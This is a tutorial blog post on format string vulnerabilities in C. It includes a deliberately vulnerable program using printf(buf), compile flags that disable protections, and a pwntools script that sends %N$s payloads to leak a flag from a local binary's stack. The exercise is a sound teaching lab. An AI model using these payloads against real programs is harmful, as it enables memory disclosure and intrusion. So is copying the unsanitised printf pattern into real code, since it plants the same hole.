<!-- ---
author: pl4int3xt
layout: post
title: F0rmat strings - Reading arbitrary memory locations
date: '2024-01-16'
description: "Learn how to leak values from the stack using format strings vulnerability"
categories: [Binary Exploitation 101]
tags: [binary exploitation]
---

## Introduction
A format strings vulnerability occurs when a program uses user-supplied input as the format string parameter in a formatted output function without proper validation or sanitation. The most common functions where format string vulnerabilities can occur are `printf`, `sprintf`, `fprintf`, and `scanf` from the C Standard Library. An attacker can read/write arbitrary memory locations,they can input `%x %x %x %x` to leak values from the stack, or use `%n` to perform arbitrary writes. 

Let's try leaking the flag.txt from the code below
```c
#include <stdio.h>
#include <stdlib.h>
#include <string.h>
#include <unistd.h>
#include <sys/types.h>

int main(int argc, char **argv){

  setvbuf(stdout, NULL, _IONBF, 0);

  char buf[64];
  char flag[64];
  char *flag_ptr = flag;
  
  // Set the gid to the effective gid
  gid_t gid = getegid();
  setresgid(gid, gid, gid);

  puts("We will evaluate any format string you give us with printf().");
  
  FILE *file = fopen("flag.txt", "r");
  if (file == NULL) {
    printf("flag.txt is missing!\n");
    exit(0);
  }
  
  fgets(flag, sizeof(flag), file);
  
  while(1) {
    printf("> ");
    fgets(buf, sizeof(buf), stdin);
    printf(buf);
  }  
  return 0;
}
```

Let's compile the code to an executable binary and remove some protections. The code is dynamically linked and its not stripped.

```shell
gcc format.c -o format -fno-stack-protector -no-pie
```

Running checksec we see everything is disabled except NX 

```shell
pl4int3xt@archlinux ~/D/p/shellcode> checksec --file=format
RELRO           STACK CANARY      NX            PIE             RPATH      RUNPATH      Symbols         FORTIFY Fortified    Fortifiable     FILE
Partial RELRO   No canary found   NX enabled    No PIE          No RPATH   No RUNPATH   33 Symbols        No    0   2format
```

The code is vulnerable to format strings and hence we can leak memory addresses from the stack 

```shell
pl4int3xt@archlinux ~/D/p/shellcode> ./format
We will evaluate any format string you give us with printf().
> name
name
> %x %x %x %x %x
78252078 fbad2288 78252078 40649f 0
> %p %p %p %p %p
0x2070252070252070 0xfbad2288 0xa70252070252070 0x40649f (nil)
> 
```

Let's write a custom script to try and leak value from the stack

```python
from pwn import *

# This will automatically get context arch, bits, os etc
elf = context.binary = ELF('./format', checksec=False)

# Let's fuzz 100 values
for i in range(50):
    try:
        # Create process (level used to reduce noise)
        p = process(level='error')
        # When we see the user prompt '>', format the counter
        # e.g. %2$s will attempt to print second pointer as string
        p.sendlineafter(b'> ', '%{}$s'.format(i).encode())
        # Receive the response
        result = p.recvuntil(b'> ')
        # Check for flag
        # if("flag" in str(result).lower()):
        print(str(i) + ': ' + str(result))
        # Exit the process
        p.close()
    except EOFError:
        pass
```

The code will loop 50 times. Running the code we are able to leak the flag from the stack

```shell
pl4int3xt@archlinux ~/D/p/shellcode> python3 fuzz.py
0: b'%0$s\n> '
4: b'\n> '
6: b'K\xe8\xff\xff\xff\x7f\n> '
17: b'(null)\n> '
18: b'(null)\n> '
19: b'(null)\n> '
20: b'(null)\n> '
21: b'(null)\n> '
22: b'(null)\n> '
23: b'(null)\n> '
24: b'(null)\n> '
25: b'\x88$\xad\xfb\n> '
27: b'flag{f0rm4t_string5_4r3_d4ng3r0u5}\n\n> '
29: b'\x89\xc7\xe8\x19\x91\x01\n> '
30: b'\x08\xe5\xff\xff\xff\x7f\n> '
31: b'UH\x89\xe5H\x81\xec\xb0\n> '
33: b'K\xe8\xff\xff\xff\x7f\n> '
34: b'K\xe8\xff\xff\xff\x7f\n> '
36: b'(null)\n> '
37: b'z\xe8\xff\xff\xff\x7f\n> '
38: b'\xd0\xe2\xff\xf7\xff\x7f\n> '
39: b'`\x11@\n> '
42: b'(null)\n> '
43: b'(null)\n> '
44: b'(null)\n> '
45: b'K\xe8\xff\xff\xff\x7f\n> '
48: b'(null)\n> '
49: b'L\x8b5\xef\x01\x1b\n> '
``` -->